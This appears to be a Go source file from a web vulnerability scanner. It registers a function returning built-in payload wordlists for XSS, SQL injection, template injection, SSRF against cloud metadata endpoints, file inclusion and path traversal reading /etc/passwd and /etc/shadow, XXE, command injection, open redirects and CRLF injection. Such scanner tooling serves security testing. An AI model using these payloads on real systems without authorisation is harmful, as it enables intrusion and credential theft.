package jsext

import (
	"github.com/grafana/sobek"
)

// setupPayloadsAPI registers vigolium.payloads(type) on the VM.
// Returns built-in payload wordlists by vulnerability type.
func setupPayloadsAPI(vm *sobek.Runtime) {
	vigolium := vm.Get("vigolium").ToObject(vm)

	_ = vigolium.Set("payloads", func(call sobek.FunctionCall) sobek.Value {
		vulnType := call.Argument(0).String()
		payloads, ok := builtinPayloads[vulnType]
		if !ok {
			return vm.NewArray()
		}
		result := make([]interface{}, len(payloads))
		for i, p := range payloads {
			result[i] = p
		}
		return vm.ToValue(result)
	})
}

var builtinPayloads = map[string][]string{
	"xss": {
		`<script>alert(1)</script>`,
		`<img src=x onerror=alert(1)>`,
		`<svg onload=alert(1)>`,
		`"><script>alert(1)</script>`,
		`'><script>alert(1)</script>`,
		`javascript:alert(1)`,
		`<img/src=x onerror=alert(1)//`,
		`<body onload=alert(1)>`,
		`<details open ontoggle=alert(1)>`,
		`'-alert(1)-'`,
		`\"-alert(1)}//`,
	},
	"sqli": {
		`' OR '1'='1`,
		`" OR "1"="1`,
		`' OR 1=1--`,
		`" OR 1=1--`,
		`1' ORDER BY 1--`,
		`1 UNION SELECT NULL--`,
		`1 UNION SELECT NULL,NULL--`,
		`' AND 1=1--`,
		`' AND 1=2--`,
		`'; WAITFOR DELAY '0:0:5'--`,
		`1' AND SLEEP(5)--`,
		`' OR SLEEP(5)#`,
		`1; SELECT pg_sleep(5)--`,
	},
	"ssti": {
		`{{7*7}}`,
		`${7*7}`,
		`<%= 7*7 %>`,
		`{{7*'7'}}`,
		`#{7*7}`,
		`*{7*7}`,
		`{7*7}`,
		`{{config}}`,
		`{{self}}`,
		`${T(java.lang.Runtime).getRuntime()}`,
		`<#assign x=7*7>${x}`,
	},
	"ssrf": {
		`http://127.0.0.1`,
		`http://localhost`,
		`http://[::1]`,
		`http://0.0.0.0`,
		`http://169.254.169.254/latest/meta-data/`,
		`http://metadata.google.internal/computeMetadata/v1/`,
		`http://100.100.100.200/latest/meta-data/`,
		`http://2130706433`, // 127.0.0.1 as decimal
		`http://0x7f000001`, // 127.0.0.1 as hex
		`http://017700000001`, // 127.0.0.1 as octal
	},
	"lfi": {
		`../../../etc/passwd`,
		`....//....//....//etc/passwd`,
		`..%2f..%2f..%2fetc%2fpasswd`,
		`/etc/passwd`,
		`/etc/shadow`,
		`..\..\..\..\windows\win.ini`,
		`/proc/self/environ`,
		`/proc/self/cmdline`,
		`php://filter/convert.base64-encode/resource=index.php`,
		`file:///etc/passwd`,
	},
	"path_traversal": {
		`../../../etc/passwd`,
		`....//....//....//etc/passwd`,
		`..%2f..%2f..%2fetc%2fpasswd`,
		`..%252f..%252f..%252fetc%252fpasswd`,
		`..%c0%af..%c0%af..%c0%afetc/passwd`,
		`..%ef%bc%8f..%ef%bc%8fetc/passwd`,
		`/..;/..;/..;/etc/passwd`,
	},
	"xxe": {
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>`,
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1/">%xxe;]>`,
	},
	"cmdi": {
		`; id`,
		`| id`,
		"` id `",
		`$(id)`,
		`& id`,
		`|| id`,
		`; cat /etc/passwd`,
		`| cat /etc/passwd`,
		`$(cat /etc/passwd)`,
		`; ping -c 1 127.0.0.1`,
		`& ping -n 1 127.0.0.1`,
	},
	"open_redirect": {
		`//evil.com`,
		`https://evil.com`,
		`//evil.com/%2f..`,
		`/\evil.com`,
		`//evil%E3%80%82com`,
		`https:evil.com`,
		`////evil.com`,
		`https://evil.com@legitimate.com`,
	},
	"crlf": {
		`%0d%0aSet-Cookie:test=1`,
		`%0d%0aX-Injected:true`,
		`%0aSet-Cookie:test=1`,
		`\r\nSet-Cookie:test=1`,
		`%E5%98%8D%E5%98%8ASet-Cookie:test=1`,
	},
}
